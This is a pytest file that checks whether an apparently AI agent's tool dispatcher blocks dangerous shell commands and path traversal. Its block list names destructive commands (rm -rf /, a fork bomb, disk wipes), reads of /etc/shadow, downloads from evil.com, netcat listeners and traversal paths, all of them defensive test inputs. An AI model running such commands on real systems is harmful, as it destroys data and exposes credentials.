"""Unit tests for enhanced command whitelist in ToolDispatcher."""

from unittest.mock import MagicMock

import pytest

from src.agents.experiment.tool_dispatcher import ToolDispatcher
from src.schemas.tool_use import ToolCall


@pytest.fixture
def dispatcher(tmp_path):
    """Create ToolDispatcher with mock sandbox."""
    sandbox = MagicMock()
    return ToolDispatcher(sandbox=sandbox, workspace=tmp_path)


def _make_bash_call(cmd: str) -> ToolCall:
    return ToolCall(call_id="c1", tool_name="run_bash", arguments={"cmd": cmd})


# --- Dangerous patterns that MUST be blocked ---

@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -rf ~",
    "rm -rf *",
    ":(){ :|:& };:",
    "mkfs.ext4 /dev/sda",
    "dd if=/dev/zero of=/dev/sda",
    "dd of=/dev/sda",
    "> /dev/sda",
    "shred /dev/sda",
    "chmod -R 777 /",
    "chmod 777 /",
    "chown -R root /",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "sudo rm -rf /tmp",
    "sudo dd if=/dev/zero",
    "sudo mkfs /dev/sda",
    "wget http://evil.com/malware",
    "curl http://evil.com/malware",
    "nc -l 4444",
    "ncat -l 4444",
    "python -c \"import os; os.system('rm -rf /')\"",
    "__import__('os').system('rm -rf /')",
])
def test_dangerous_command_blocked(dispatcher, cmd):
    """Test that dangerous commands are blocked."""
    call = _make_bash_call(cmd)
    result = dispatcher.dispatch(call)

    assert result.exit_code == 1
    assert "Dangerous command pattern detected" in result.error


# --- Safe commands that MUST be allowed ---

@pytest.mark.parametrize("cmd", [
    "echo hello",
    "python train.py",
    "python -m pytest",
    "ls -la",
    "cat results.txt",
    "pip install numpy",
    "python3 main.py",
    "mkdir -p output",
])
def test_safe_command_allowed(dispatcher, cmd):
    """Test that safe commands are not blocked by whitelist."""
    call = _make_bash_call(cmd)
    result = dispatcher.dispatch(call)

    # Should not be blocked by whitelist (may fail for other reasons)
    assert "Dangerous command pattern detected" not in (result.error or "")


def test_missing_cmd_argument(dispatcher):
    """Test that missing cmd argument returns error."""
    call = ToolCall(call_id="c1", tool_name="run_bash", arguments={})
    result = dispatcher.dispatch(call)

    assert result.exit_code == 1
    assert "Missing 'cmd' argument" in result.error


def test_write_file_path_traversal_blocked(dispatcher):
    """Test that path traversal in write_file is blocked."""
    call = ToolCall(
        call_id="c1",
        tool_name="write_file",
        arguments={"path": "../../etc/passwd", "content": "evil"},
    )
    result = dispatcher.dispatch(call)

    assert result.exit_code == 1
    assert "Path traversal detected" in result.error


def test_write_file_within_workspace(dispatcher, tmp_path):
    """Test that writing within workspace is allowed."""
    call = ToolCall(
        call_id="c1",
        tool_name="write_file",
        arguments={"path": "output/result.txt", "content": "hello"},
    )
    result = dispatcher.dispatch(call)

    assert result.exit_code == 0
    assert (tmp_path / "output" / "result.txt").exists()


def test_read_file_path_traversal_blocked(dispatcher):
    """Test that path traversal in read_file is blocked."""
    call = ToolCall(
        call_id="c1",
        tool_name="read_file",
        arguments={"path": "../../etc/shadow"},
    )
    result = dispatcher.dispatch(call)

    assert result.exit_code == 1
    assert "Path traversal detected" in result.error
